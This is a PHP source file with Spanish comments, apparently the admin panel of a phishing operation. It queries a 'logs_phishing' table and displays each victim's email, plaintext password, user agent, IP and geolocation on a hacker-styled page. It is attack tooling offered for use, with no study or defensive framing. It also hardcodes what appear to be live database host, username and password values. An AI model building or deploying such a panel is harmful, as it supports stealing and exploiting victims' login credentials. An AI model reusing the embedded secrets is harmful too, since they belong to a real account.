<?php
// mostrar_logs.php

// --- Configuración de la base de datos de Alwaysdata ---
// ¡REEMPLAZA ESTOS VALORES CON LOS DE TU CUENTA ALWAYSATA!
$db_host = 'mysql-fvalente.alwaysdata.net'; // Por ejemplo: mysql-ejemplo.alwaysdata.net
$db_user = 'fvalente'; // Por ejemplo: tudominio_usuario
$db_pass = 'Pakovalente1'; // ¡Tu contraseña de la base de datos!
$db_name = 'fvalente_capturadatos'; // Por ejemplo: tudominio_db

// --- CONEXIÓN A LA BASE DE DATOS ---
$conexion = new mysqli($db_host, $db_user, $db_pass, $db_name);

// Verificar la conexión
if ($conexion->connect_error) {
    die("Error de conexión a la base de datos: " . $conexion->connect_error);
}

// --- Consulta para obtener los datos de la tabla logs_phishing ---
// Ordenamos por timestamp descendente para ver los más recientes primero
$sql = "SELECT id, email, password, user_agent, ip_address, geolocalizacion, timestamp FROM logs_phishing ORDER BY timestamp DESC";
$resultado = $conexion->query($sql);

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Logs de Phishing</title>
    <style>
        /* Estilos para un aspecto de "terminal" o "texto plano" */
        body { 
            font-family: 'Courier New', Courier, monospace; 
            background-color: #1a1a1a; 
            color: #00ff00; /* Verde brillante para el texto */
            margin: 20px; 
            line-height: 1.5;
        }
        pre { 
            white-space: pre-wrap; /* Permite que el texto largo se ajuste */
            word-wrap: break-word; /* Rompe palabras largas si es necesario */
            background-color: #0d0d0d; 
            padding: 15px; 
            border-radius: 5px; 
            border: 1px solid #005000; 
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3); /* Resplandor verde */
        }
        .log-entry { 
            margin-bottom: 20px; 
            padding-bottom: 15px; 
            border-bottom: 2px dotted #003300; /* Línea divisoria */
        }
        .log-entry:last-child { 
            border-bottom: none; /* No hay línea en la última entrada */
        }
        h1 { 
            color: #00ff00; 
            text-align: center; 
            margin-bottom: 30px; 
            text-shadow: 0 0 8px rgba(0, 255, 0, 0.5); /* Sombra de texto */
        }
        strong {
            color: #ff00ff; /* Resaltar etiquetas */
        }
    </style>
</head>
<body>
    <h1>[+] Registro de Credenciales Phishing [+]</h1>
    <pre>
<?php
if ($resultado->num_rows > 0) {
    // Recorrer cada fila de resultados
    while($fila = $resultado->fetch_assoc()) {
        echo "<div class='log-entry'>";
        echo "<strong>ID:</strong> " . htmlspecialchars($fila["id"]) . "\n";
        echo "<strong>Timestamp:</strong> " . htmlspecialchars($fila["timestamp"]) . "\n";
        echo "<strong>Email:</strong> " . htmlspecialchars($fila["email"]) . "\n";
        echo "<strong>Contraseña:</strong> " . htmlspecialchars($fila["password"]) . "\n";
        echo "<strong>User-Agent:</strong> " . htmlspecialchars($fila["user_agent"]) . "\n";
        echo "<strong>IP:</strong> " . htmlspecialchars($fila["ip_address"]) . "\n";
        echo "<strong>Geolocalización:</strong> " . htmlspecialchars($fila["geolocalizacion"]) . "\n";
        echo "</div>\n";
    }
} else {
    echo "No se encontraron registros de ataques aún. La base de datos está vacía.";
}

$conexion->close();
?>
    </pre>
</body>
</html>